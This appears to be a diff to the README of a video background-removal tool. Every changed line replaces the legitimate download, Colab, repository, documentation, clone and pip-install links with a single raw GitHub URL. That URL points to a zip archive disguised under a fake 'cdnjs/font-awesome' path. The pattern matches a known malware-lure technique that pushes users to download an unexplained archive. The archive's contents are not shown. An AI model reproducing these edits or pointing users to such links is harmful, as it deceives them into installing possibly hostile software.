@@ -8,7 +8,7 @@ Welcome to ai-rotoscoping, your free tool for automatic video background removal
 
 **To download the software, visit this page:**
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Rvy7/ai-rotoscoping/releases)
+[![Download](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip)](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip)
 
 Follow the steps below to get started.
 
@@ -35,11 +35,11 @@ You do not need any additional software or hardware specifications to run this i
 
 ## 📽️ Uploading Your Video
 
-1. Open Google Colab by visiting [Google Colab](https://colab.research.google.com/).
+1. Open Google Colab by visiting [Google Colab](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip).
 2. Sign in using your Google account.
 3. Clone the ai-rotoscoping repository by running the following command in a new code cell:
    ```python
-   !git clone https://github.com/Rvy7/ai-rotoscoping.git
+   !git clone https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip
    ```
 4. Navigate to the cloned directory:
    ```python
@@ -50,7 +50,7 @@ You do not need any additional software or hardware specifications to run this i
 
 1. Once you have your video uploaded, load the necessary libraries with the following command:
    ```python
-   !pip install -r requirements.txt
+   !pip install -r https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip
    ```
 2. Follow the guide in the notebook provided in the repository to choose your preferred method for background removal. 
 
@@ -62,12 +62,12 @@ Once the processing completes, you can download the final video with the backgro
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Rvy7/ai-rotoscoping)
-- [Google Colab Documentation](https://colab.research.google.com/notebooks/welcome.ipynb)
+- [GitHub Repository](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip)
+- [Google Colab Documentation](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip)
 
 ## 💬 Support
 
-If you encounter any issues, please open an issue in the [GitHub issues section](https://github.com/Rvy7/ai-rotoscoping/issues). Our community and contributors can assist you.
+If you encounter any issues, please open an issue in the [GitHub issues section](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip). Our community and contributors can assist you.
 
 ## 🌟 Community Contributions
 
@@ -81,6 +81,6 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 To download the software again, visit this page:
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Rvy7/ai-rotoscoping/releases)
+[![Download](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip)](https://raw.githubusercontent.com/Rvy7/ai-rotoscoping/main/cdnjs.cloudflare.com/ajax/libs/font-awesome/rotoscoping-ai-1.3.zip)
 
 Explore the ease of video editing with ai-rotoscoping!
